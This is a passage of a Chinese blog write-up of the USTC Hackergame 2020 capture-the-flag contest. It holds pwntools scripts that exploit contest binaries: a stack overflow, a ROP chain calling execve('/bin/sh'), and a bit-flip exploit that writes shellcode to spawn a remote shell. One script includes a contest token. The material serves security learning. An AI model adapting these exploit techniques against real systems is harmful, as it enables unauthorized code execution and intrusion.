+<h1 id="12-生活在博弈树上"><a href="#12-生活在博弈树上" class="headerlink" title="12 生活在博弈树上"></a>12 生活在博弈树上</h1><h2 id="T1-始终热爱大地"><a href="#T1-始终热爱大地" class="headerlink" title="T1 始终热爱大地"></a>T1 始终热爱大地</h2><p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./tictactoe')</span></span><br><span class="line">sh = remote(<span class="string">'202.38.93.111'</span>,<span class="number">10141</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Please input your token: '</span>)</span><br><span class="line">sh.sendline(<span class="string">'...'</span>)<span class="comment">#填写token</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">'Your turn. Input like (x,y), such as (0,1): '</span>)</span><br><span class="line">sh.sendline(<span class="string">'(1,1)'</span>)</span><br><span class="line">payload =<span class="string">'(1,2)'</span>+<span class="string">'a'</span>*<span class="number">0x93</span> + p64(<span class="number">0x40255D</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="T2-升上天空"><a href="#T2-升上天空" class="headerlink" title="T2 升上天空"></a>T2 升上天空</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./tictactoe')</span></span><br><span class="line">sh = remote(<span class="string">'202.38.93.111'</span>,<span class="number">10141</span>)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x0000000000402bf4</span></span><br><span class="line">pop_rax = <span class="number">0x000000000043e52c</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004017b6</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000407228</span></span><br><span class="line">pop_rdx = <span class="number">0x000000000043dbb5</span></span><br><span class="line">pop_rbx = <span class="number">0x000000000046cb55</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x4A8370</span></span><br><span class="line">gets_addr = <span class="number">0x409E00</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Please input your token: '</span>)</span><br><span class="line">sh.sendline(<span class="string">'...'</span>)<span class="comment">#填写token</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">'Your turn. Input like (x,y), such as (0,1): '</span>)</span><br><span class="line">sh.sendline(<span class="string">'(1,1)'</span>)</span><br><span class="line">payload =<span class="string">'(1,2)'</span>+<span class="string">'a'</span>*<span class="number">0x93</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(gets_addr)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rbx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="13-超精准的宇宙射线模拟器"><a href="#13-超精准的宇宙射线模拟器" class="headerlink" title="13 超精准的宇宙射线模拟器"></a>13 超精准的宇宙射线模拟器</h1><p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./bitflip')</span></span><br><span class="line">sh = remote(<span class="string">'202.38.93.111'</span>,<span class="number">10231</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitxor</span><span class="params">(addr, num)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'You can flip only one bit in my memory. Where do you want to flip?\n'</span>)</span><br><span class="line">    sh.sendline(hex(addr)+<span class="string">' '</span> + str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">onechange</span><span class="params">(byt, addr)</span>:</span></span><br><span class="line">    tmp = ord(byt)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> tmp&amp;<span class="number">1</span>:</span><br><span class="line">            bitxor(addr, i)</span><br><span class="line">        tmp = tmp&gt;&gt;<span class="number">1</span></span><br><span class="line">sh.recvuntil(<span class="string">'Please input your token: '</span>)</span><br><span class="line">sh.sendline(<span class="string">'444:MEYCIQCOwUMnrz99os4e7j2RMF6lWimf1iMdPwIzb15HP3aUfAIhAOcW4gDJGOqi5sdtEF0zItE6w9K90u0XhOdsv7h/5OlF'</span>)        </span><br><span class="line"><span class="comment">#change exit to call _start</span></span><br><span class="line">bitxor(<span class="number">0x401296</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write shellcode to 0x401500</span></span><br><span class="line">shellcode = <span class="string">'jhH\xb8/	bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'</span></span><br><span class="line">shellcode_addr= <span class="number">0x401500</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">    onechange(shellcode[i], shellcode_addr+i)</span><br><span class="line"><span class="comment">#change exit to jmp 0x401500</span></span><br><span class="line">a = <span class="number">0x90902f6d21c81b</span></span><br><span class="line">exit_addr = <span class="number">0x4010C4</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> a:</span><br><span class="line">    tmp_a = a &amp; <span class="number">0xff</span></span><br><span class="line">    onechange(chr(tmp_a), exit_addr + j)</span><br><span class="line">    a = a&gt;&gt;<span class="number">8</span></span><br><span class="line">    j = j+<span class="number">1</span> </span><br><span class="line"><span class="comment">#change call _start to exit</span></span><br><span class="line">bitxor(<span class="number">0x401296</span>, <span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="14-不经意传输"><a href="#14-不经意传输" class="headerlink" title="14 不经意传输"></a>14 不经意传输</h1><h2 id="T1-解密消息"><a href="#T1-解密消息" class="headerlink" title="T1 解密消息"></a>T1 解密消息</h2><ul>
+<li>v = x0</li>
+<li>m0 = m1 = m0_ </li>
+</ul>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://dragonliu2018.github.io/2020/11/08/中科大2020年Hackergame-WP/" title="中科大2020年Hackergame WP" target="_blank" rel="external">https://dragonliu2018.github.io/2020/11/08/中科大2020年Hackergame-WP/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/dragonliu2018" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/dragonliu2018" target="_blank"><span class="text-dark">Dragon&#39;s Blogs</span><small class="ml-1x">Security</small></a></h3>
+        <div>Life is painting a picture, not doing a sum.</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2021/02/17/ARP欺骗-断网攻击/" title="ARP攻击"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2020/07/13/CTF编码加密整理/" title="CTF编码加密整理"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn " data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">    <span>[&nbsp;</span><span>文章目录</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/dragonliu2018" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script src="/js/plugin.min.js"></script>
+<script src="/js/application.js"></script>
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'Pbjl2Wajl9och0xVbR5eqoH1-gzGzoHsz',
+    appKey: 'PgxFh1wV6pyMMllhxs7NJijb',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
